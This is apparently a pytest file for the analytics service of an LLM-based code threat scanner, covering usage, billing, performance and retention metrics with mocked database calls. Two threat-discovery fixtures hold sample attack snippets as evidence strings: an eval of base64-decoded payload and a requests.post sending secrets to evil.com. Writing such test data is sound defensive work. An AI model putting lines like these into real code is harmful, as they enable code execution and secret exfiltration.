"""
Analytics Service Tests

Comprehensive tests for Pro tier analytics tracking, usage metrics,
and business intelligence for LLM-powered threat detection features.

Test Coverage:
- LLM usage tracking and metrics collection
- Threat discovery analytics and categorization
- Pro feature usage monitoring and billing support
- Performance metrics and response time tracking
- User behavior analytics and engagement metrics
- Aggregate statistics and reporting capabilities
- Data retention and privacy compliance
"""

from __future__ import annotations

import pytest
from datetime import datetime, timedelta
from unittest.mock import patch

from services.analytics_service import analytics_service, AnalyticsService


class TestLLMUsageTracking:
    """Test LLM usage analytics and metrics tracking"""

    @pytest.mark.asyncio
    async def test_track_llm_usage_success(self):
        """Test successful LLM usage tracking"""
        
        usage_data = {
            "user_id": "test_user_123",
            "scan_id": "scan_abc_123",
            "model_used": "gpt-4",
            "tokens_used": 1500,
            "processing_time_ms": 2300,
            "insights_generated": [
                {
                    "threat_category": "code_injection",
                    "confidence": 0.95,
                    "analysis_type": "zero_day_detection",
                    "title": "Dynamic code execution",
                    "description": "Dangerous eval usage detected",
                    "severity_adjustment": 0.2
                }
            ],
            "cache_hit": False,
            "fallback_used": False
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "metric_123", "created_at": datetime.utcnow()}]
            
            result = await analytics_service.track_llm_usage(**usage_data)
            
            assert result is True
            mock_db.assert_called_once()
            
            # Verify stored procedure call
            call_args = mock_db.call_args[0]
            assert call_args[0] == "sp_TrackLLMUsage"
            
            stored_data = call_args[1]
            assert stored_data["user_id"] == "test_user_123"
            assert stored_data["model_used"] == "gpt-4"
            assert stored_data["tokens_used"] == 1500
            assert stored_data["processing_time_ms"] == 2300

    @pytest.mark.asyncio
    async def test_track_llm_usage_with_cache_hit(self):
        """Test LLM usage tracking for cached responses"""
        
        usage_data = {
            "user_id": "cache_user_123",
            "scan_id": "cache_scan_123", 
            "model_used": "gpt-4",
            "tokens_used": 0,  # No tokens for cache hit
            "processing_time_ms": 50,  # Fast cache response
            "insights_generated": [],
            "cache_hit": True,
            "fallback_used": False
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "cache_metric_123"}]
            
            result = await analytics_service.track_llm_usage(**usage_data)
            
            assert result is True
            
            stored_data = mock_db.call_args[0][1]
            assert stored_data["cache_hit"] is True
            assert stored_data["tokens_used"] == 0
            assert stored_data["processing_time_ms"] == 50

    @pytest.mark.asyncio
    async def test_track_llm_usage_with_fallback(self):
        """Test LLM usage tracking when fallback is used"""
        
        usage_data = {
            "user_id": "fallback_user_123",
            "scan_id": "fallback_scan_123",
            "model_used": "fallback",
            "tokens_used": 0,
            "processing_time_ms": 100,
            "insights_generated": [],
            "cache_hit": False,
            "fallback_used": True
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "fallback_metric_123"}]
            
            result = await analytics_service.track_llm_usage(**usage_data)
            
            assert result is True
            
            stored_data = mock_db.call_args[0][1]
            assert stored_data["fallback_used"] is True
            assert stored_data["model_used"] == "fallback"

    @pytest.mark.asyncio
    async def test_track_llm_usage_database_error(self):
        """Test LLM usage tracking with database errors"""
        
        usage_data = {
            "user_id": "error_user_123",
            "scan_id": "error_scan_123",
            "model_used": "gpt-4",
            "tokens_used": 1000,
            "processing_time_ms": 1500,
            "insights_generated": [],
            "cache_hit": False,
            "fallback_used": False
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.side_effect = Exception("Database connection error")
            
            result = await analytics_service.track_llm_usage(**usage_data)
            
            # Should return False on database errors
            assert result is False


class TestThreatDiscoveryAnalytics:
    """Test threat discovery analytics and categorization"""

    @pytest.mark.asyncio
    async def test_track_threat_discovery_zero_day(self):
        """Test tracking zero-day threat discoveries"""
        
        threat_data = {
            "user_id": "threat_user_123",
            "threat_type": "code_injection",
            "severity": "high",
            "confidence": 0.92,
            "scan_id": "threat_scan_123",
            "is_zero_day": True,
            "analysis_type": "llm_analysis",
            "evidence_snippet": "eval(base64.decode(payload))",
            "remediation_steps": [
                "Remove dynamic code execution",
                "Validate all user inputs"
            ]
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "discovery_123", "zero_day_score": 95}]
            
            result = await analytics_service.track_threat_discovery(**threat_data)
            
            assert result is True
            
            call_args = mock_db.call_args[0]
            assert call_args[0] == "sp_TrackThreatDiscovery"
            
            stored_data = call_args[1]
            assert stored_data["user_id"] == "threat_user_123"
            assert stored_data["threat_type"] == "code_injection"
            assert stored_data["is_zero_day"] is True
            assert stored_data["confidence"] == 0.92
            assert "eval(base64.decode(payload))" in stored_data["evidence_snippet"]

    @pytest.mark.asyncio
    async def test_track_threat_discovery_static_analysis(self):
        """Test tracking threats from static analysis"""
        
        threat_data = {
            "user_id": "static_user_123",
            "threat_type": "network_exfiltration",
            "severity": "medium",
            "confidence": 0.75,
            "scan_id": "static_scan_123",
            "is_zero_day": False,
            "analysis_type": "static_analysis",
            "evidence_snippet": "requests.post('http://evil.com', data=secrets)",
            "remediation_steps": ["Implement network egress filtering"]
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "static_discovery_123"}]
            
            result = await analytics_service.track_threat_discovery(**threat_data)
            
            assert result is True
            
            stored_data = mock_db.call_args[0][1]
            assert stored_data["is_zero_day"] is False
            assert stored_data["analysis_type"] == "static_analysis"
            assert stored_data["threat_type"] == "network_exfiltration"

    @pytest.mark.asyncio
    async def test_track_multiple_threat_discoveries(self):
        """Test tracking multiple threat discoveries in sequence"""
        
        threats = [
            {
                "user_id": "multi_user_123",
                "threat_type": "code_injection",
                "severity": "high",
                "confidence": 0.88,
                "scan_id": "multi_scan_123",
                "is_zero_day": True,
                "analysis_type": "llm_analysis"
            },
            {
                "user_id": "multi_user_123",
                "threat_type": "data_exfiltration", 
                "severity": "medium",
                "confidence": 0.72,
                "scan_id": "multi_scan_123",
                "is_zero_day": False,
                "analysis_type": "llm_analysis"
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "multi_discovery"}]
            
            results = []
            for threat in threats:
                result = await analytics_service.track_threat_discovery(**threat)
                results.append(result)
            
            assert all(results)
            assert mock_db.call_count == 2


class TestProFeatureUsageAnalytics:
    """Test Pro tier feature usage analytics"""

    @pytest.mark.asyncio  
    async def test_track_pro_feature_usage_llm_analysis(self):
        """Test tracking Pro LLM analysis feature usage"""
        
        usage_data = {
            "user_id": "pro_user_123",
            "feature_type": "llm_analysis",
            "usage_details": {
                "analysis_types": ["zero_day_detection", "context_correlation"],
                "tokens_consumed": 2500,
                "processing_time": 3200,
                "insights_count": 4,
                "cache_hit_rate": 0.25
            },
            "session_id": "session_abc_123"
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "pro_usage_123", "billing_units": 1}]
            
            result = await analytics_service.track_pro_feature_usage(**usage_data)
            
            assert result is True
            
            call_args = mock_db.call_args[0]
            assert call_args[0] == "sp_TrackProFeatureUsage"
            
            stored_data = call_args[1]
            assert stored_data["user_id"] == "pro_user_123"
            assert stored_data["feature_type"] == "llm_analysis"
            assert "zero_day_detection" in stored_data["usage_details"]

    @pytest.mark.asyncio
    async def test_track_pro_feature_usage_advanced_remediation(self):
        """Test tracking advanced remediation feature usage"""
        
        usage_data = {
            "user_id": "remediation_user_123",
            "feature_type": "advanced_remediation",
            "usage_details": {
                "remediation_suggestions_count": 8,
                "custom_policies_applied": 3,
                "auto_fix_attempts": 2,
                "success_rate": 0.75
            }
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "remediation_usage_123"}]
            
            result = await analytics_service.track_pro_feature_usage(**usage_data)
            
            assert result is True
            
            stored_data = mock_db.call_args[0][1]
            assert stored_data["feature_type"] == "advanced_remediation"
            assert "remediation_suggestions_count" in stored_data["usage_details"]

    @pytest.mark.asyncio
    async def test_get_user_analytics_summary(self):
        """Test retrieving user analytics summary"""
        
        mock_summary_data = [
            {
                "total_scans": 150,
                "llm_analyses": 45,
                "zero_day_discoveries": 8,
                "total_threats_found": 67,
                "avg_confidence": 0.82,
                "total_tokens_used": 125000,
                "cache_hit_rate": 0.34,
                "period_start": datetime.utcnow() - timedelta(days=30),
                "period_end": datetime.utcnow()
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = mock_summary_data
            
            summary = await analytics_service.get_user_analytics_summary(
                user_id="summary_user_123",
                start_date=datetime.utcnow() - timedelta(days=30),
                end_date=datetime.utcnow()
            )
            
            assert summary is not None
            assert summary["total_scans"] == 150
            assert summary["llm_analyses"] == 45
            assert summary["zero_day_discoveries"] == 8
            assert summary["avg_confidence"] == 0.82

    @pytest.mark.asyncio
    async def test_get_threat_discovery_trends(self):
        """Test retrieving threat discovery trends"""
        
        mock_trends_data = [
            {
                "date": datetime.utcnow() - timedelta(days=7),
                "threat_type": "code_injection",
                "discovery_count": 12,
                "avg_confidence": 0.87,
                "zero_day_count": 3
            },
            {
                "date": datetime.utcnow() - timedelta(days=6),
                "threat_type": "code_injection", 
                "discovery_count": 8,
                "avg_confidence": 0.91,
                "zero_day_count": 2
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = mock_trends_data
            
            trends = await analytics_service.get_threat_discovery_trends(
                user_id="trends_user_123",
                threat_type="code_injection",
                days=7
            )
            
            assert len(trends) == 2
            assert trends[0]["discovery_count"] == 12
            assert trends[0]["zero_day_count"] == 3


class TestPerformanceMetrics:
    """Test performance metrics tracking and analysis"""

    @pytest.mark.asyncio
    async def test_track_api_performance_metrics(self):
        """Test tracking API endpoint performance metrics"""
        
        performance_data = {
            "endpoint": "/v1/scan-enhanced",
            "method": "POST",
            "response_time_ms": 2800,
            "status_code": 200,
            "user_id": "perf_user_123",
            "user_tier": "pro",
            "features_used": ["llm_analysis", "context_correlation"],
            "payload_size_bytes": 45000,
            "timestamp": datetime.utcnow()
        }
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"id": "perf_metric_123"}]
            
            result = await analytics_service.track_api_performance(**performance_data)
            
            assert result is True
            
            stored_data = mock_db.call_args[0][1]
            assert stored_data["endpoint"] == "/v1/scan-enhanced"
            assert stored_data["response_time_ms"] == 2800
            assert stored_data["user_tier"] == "pro"

    @pytest.mark.asyncio
    async def test_get_performance_statistics(self):
        """Test retrieving performance statistics"""
        
        mock_perf_stats = [
            {
                "endpoint": "/v1/scan-enhanced",
                "avg_response_time_ms": 2100,
                "p95_response_time_ms": 3500,
                "p99_response_time_ms": 4800,
                "request_count": 1250,
                "error_rate": 0.02,
                "period": "24h"
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = mock_perf_stats
            
            stats = await analytics_service.get_performance_statistics(
                endpoint="/v1/scan-enhanced",
                hours=24
            )
            
            assert len(stats) == 1
            assert stats[0]["avg_response_time_ms"] == 2100
            assert stats[0]["error_rate"] == 0.02


class TestDataRetentionAndPrivacy:
    """Test data retention policies and privacy compliance"""

    @pytest.mark.asyncio
    async def test_anonymize_user_analytics(self):
        """Test user data anonymization for privacy compliance"""
        
        user_id = "privacy_user_123"
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"anonymized_records": 156}]
            
            result = await analytics_service.anonymize_user_analytics(user_id)
            
            assert result is True
            
            call_args = mock_db.call_args[0]
            assert call_args[0] == "sp_AnonymizeUserAnalytics"
            assert call_args[1]["user_id"] == user_id

    @pytest.mark.asyncio
    async def test_purge_expired_analytics(self):
        """Test purging of expired analytics data"""
        
        retention_days = 365
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"purged_records": 2450}]
            
            result = await analytics_service.purge_expired_analytics(retention_days)
            
            assert result is True
            
            stored_data = mock_db.call_args[0][1]
            assert stored_data["retention_days"] == 365

    @pytest.mark.asyncio
    async def test_export_user_analytics(self):
        """Test exporting user analytics for GDPR compliance"""
        
        user_id = "export_user_123"
        
        mock_export_data = [
            {
                "table": "llm_usage_metrics",
                "record_count": 234,
                "date_range": "2023-01-01 to 2024-01-01"
            },
            {
                "table": "threat_discoveries", 
                "record_count": 67,
                "date_range": "2023-01-01 to 2024-01-01"
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = mock_export_data
            
            export_data = await analytics_service.export_user_analytics(user_id)
            
            assert len(export_data) == 2
            assert export_data[0]["table"] == "llm_usage_metrics"
            assert export_data[0]["record_count"] == 234


class TestAggregateStatistics:
    """Test aggregate statistics and reporting"""

    @pytest.mark.asyncio
    async def test_get_platform_statistics(self):
        """Test retrieving platform-wide statistics"""
        
        mock_platform_stats = [
            {
                "total_users": 12500,
                "active_pro_users": 850,
                "total_scans_today": 3400,
                "llm_analyses_today": 750,
                "zero_day_discoveries_today": 23,
                "avg_threat_confidence": 0.84,
                "top_threat_categories": [
                    {"category": "code_injection", "count": 145},
                    {"category": "data_exfiltration", "count": 98}
                ]
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = mock_platform_stats
            
            stats = await analytics_service.get_platform_statistics()
            
            assert stats["total_users"] == 12500
            assert stats["active_pro_users"] == 850
            assert stats["zero_day_discoveries_today"] == 23
            assert len(stats["top_threat_categories"]) == 2

    @pytest.mark.asyncio
    async def test_generate_monthly_report(self):
        """Test generating monthly analytics reports"""
        
        mock_monthly_data = [
            {
                "month": "2024-01",
                "new_users": 450,
                "pro_conversions": 67, 
                "total_scans": 89000,
                "llm_analyses": 12300,
                "unique_threats_found": 1850,
                "zero_day_discoveries": 145,
                "avg_response_time_ms": 2100,
                "user_satisfaction": 4.7
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = mock_monthly_data
            
            report = await analytics_service.generate_monthly_report("2024-01")
            
            assert report["month"] == "2024-01" 
            assert report["pro_conversions"] == 67
            assert report["zero_day_discoveries"] == 145
            assert report["user_satisfaction"] == 4.7


class TestAnalyticsServiceIntegration:
    """Test analytics service integration with other components"""

    @pytest.mark.asyncio
    async def test_analytics_service_initialization(self):
        """Test analytics service proper initialization"""
        
        service = AnalyticsService()
        assert service is not None
        
        # Verify service methods are available
        assert hasattr(service, 'track_llm_usage')
        assert hasattr(service, 'track_threat_discovery')
        assert hasattr(service, 'track_pro_feature_usage')

    @pytest.mark.asyncio
    async def test_analytics_batch_processing(self):
        """Test batch processing of analytics events"""
        
        events = [
            {
                "type": "llm_usage",
                "data": {
                    "user_id": "batch_user_1",
                    "tokens_used": 1000,
                    "model_used": "gpt-4"
                }
            },
            {
                "type": "threat_discovery", 
                "data": {
                    "user_id": "batch_user_2",
                    "threat_type": "code_injection",
                    "is_zero_day": True
                }
            }
        ]
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"processed_count": 2}]
            
            result = await analytics_service.process_analytics_batch(events)
            
            assert result is True
            assert mock_db.call_count == 2  # One call per event

    @pytest.mark.asyncio 
    async def test_analytics_health_check(self):
        """Test analytics service health check"""
        
        with patch('api.database.db.execute_procedure') as mock_db:
            mock_db.return_value = [{"status": "healthy", "last_update": datetime.utcnow()}]
            
            health = await analytics_service.health_check()
            
            assert health["status"] == "healthy"
            assert "last_update" in health